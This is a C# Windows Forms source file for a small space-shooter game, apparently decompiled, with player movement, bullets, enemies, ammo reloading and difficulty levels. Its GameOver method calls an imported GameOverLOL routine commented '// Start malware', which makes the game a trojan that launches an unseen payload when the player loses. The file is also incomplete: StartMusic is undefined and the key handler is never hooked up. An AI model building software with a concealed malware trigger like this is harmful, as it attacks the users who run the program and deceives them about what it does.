using System.Windows.Forms;
using System.Drawing;
using System.Collections.Generic;
using GameOverLOL;

namespace Gameform
{

    public class Gameform : Form
    { // inheritance from "Form" which means that this game class was made entirely with Windows Form
        public Thread musiz;
        private int playerX;
        private int playerY;
        private List<int> bulletsX;
        private List<int> bulletsY;
        private List<int> enemiesX;
        private List<int> enemiesY;
        private int score;
        private int ammo;
        private string difficulty = "EASY";
        private int maxAmmo;
        private int reloadInterval;
        private Timer timer;
        private Timer reloadTimer;
        private float lolyMax = 40f;
        private float loly;
        public Gameform()
        {
            //         ? Control ?
            playerX = ((Control)this).Width / 2; // Player size X
            playerY = ((Control)this).Height - 70; // Player size Y
            bulletsX = new List<int>();
            bulletsY = new List<int>();
            enemiesX = new List<int>();
            enemiesY = new List<int>();

            // Game config
            score = 0;
            ammo = 15;
            maxAmmo = 20;
            reloadInterval = 2500;
            loly = lolyMax;

            // Setup timer
            // TODO: decompiler "Timer" class
            timer = new Timer();
            timer.Interval = 50;
            timer.Tick += Timer_Tick;
            timer.Start();
            reloadTimer = new Timer();
            reloadTimer.Interval = reloadInterval;
            reloadTimer.Tick += ReloadTimer_Tick;
            reloadTimer.Start();
            StartMusic();
        }

        private void GameForm_KeyDown(object sender, KeyEventArgs e)
        {
            if ((int)e.KeyCode == 65 && playerX > 0)
            {
                playerX -= 10;
            }
            else if ((int)e.KeyCode == 68 && playerX < ((Control)this).Width - 10)
            {
                playerX += 10;
            }
            else if ((int)e.KeyCode == 87 && playerY > 0)
            {
                playerY -= 10;
            }
            else if ((int)e.KeyCode == 83 && playerY < ((Control)this).Height - 10)
            {
                playerY += 10;
            }
            else if ((int)e.KeyCode == 32 && ammo > 0)
            {
                bulletsX.Add(playerX + 3);
                bulletsY.Add(playerY - 10);
                ammo--;
            }
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            Random random = new Random();
            if (random.Next(0, (int)loly) < 2)
            {
                enemiesX.Add(random.Next(0, ((Control)this).Width - 20));
                enemiesY.Add(0);
            }
            for (int i = 0; i < bulletsX.Count; i++)
            {
                bulletsY[i] -= 10;
                if (bulletsY[i] < 0)
                {
                    bulletsX.RemoveAt(i);
                    bulletsY.RemoveAt(i);
                    i--;
                    continue;
                }
                for (int j = 0; j < enemiesX.Count; j++)
                {
                    if (bulletsX[i] >= enemiesX[j] && bulletsX[i] <= enemiesX[j] + 20 && bulletsY[i] <= enemiesY[j] + 20)
                    {
                        score++;
                        bulletsX.RemoveAt(i);
                        bulletsY.RemoveAt(i);
                        i--;
                        enemiesX.RemoveAt(j);
                        enemiesY.RemoveAt(j);
                        break;
                    }
                }
            }
            for (int k = 0; k < enemiesX.Count; k++)
            {
                enemiesY[k] += 10;
                if (enemiesY[k] >= ((Control)this).Height)
                {
                    enemiesX.RemoveAt(k);
                    enemiesY.RemoveAt(k);
                    k--;
                }
                else if (enemiesX[k] >= playerX - 20 && enemiesX[k] <= playerX + 20 && enemiesY[k] >= playerY - 20 && enemiesY[k] <= playerY + 20)
                {
                    GameOver();
                    return;
                }
            }
            ((Control)this).Invalidate();
        }

        private void ReloadTimer_Tick(object sender, EventArgs e)
	{
		if (ammo < maxAmmo)
		{
			ammo++;
		}
		loly -= 1f;
		if (loly < 2f)
		{
			loly = 2f;
		}
		if (loly == lolyMax)
		{
			difficulty = "EASY";
		}
		else if (loly < 10f && loly > 6f)
		{
			difficulty = "MEDIUM";
		}
		else if (loly < 6f && loly > 3f)
		{
			difficulty = "HARD";
		}
		else if (loly < 3f)
		{
			difficulty = "EXTREME";
		}
	}

    protected override void OnPaintBackground(PaintEventArgs e)
	{
        base.OnPaintBackground(e);
        e.Graphics.Clear(Color.Black);
	}

    protected override void OnPaint(PaintEventArgs e)
	{
        base.OnPaint(e);
        Graphics graphics = e.Graphics;
        for (int i = 0; i < bulletsX.Count; i++) {
           graphics.FillRectangle(Brushes.White, bulletsX[i], bulletsY[i], 4, 10); 
        }
        for (int j = 0; j < enemiesX.Count; j++)
		{
			graphics.FillRectangle(Brushes.Red, enemiesX[j], enemiesY[j], 20, 20);
		}
		graphics.FillRectangle(Brushes.Blue, playerX - 10, playerY - 10, 20, 20);
		graphics.DrawString("Score: " + score, ((Control)this).Font, Brushes.White, 10f, 10f);
		graphics.DrawString("Ammo: " + ammo, ((Control)this).Font, Brushes.White, 10f, 30f);
		graphics.DrawString("Difficulty: " + difficulty, ((Control)this).Font, Brushes.White, 10f, 50f);
		graphics.DrawString("SLAY ALL!", ((Control)this).Font, Brushes.White, 10f, 70f);
	}


        private void GameOver()
        {
            musiz.Abort();
            GameOverLOL.GameOverLOL.LOL(); // Start malware
            timer.Stop();
            reloadTimer.Stop();
        }
    }
}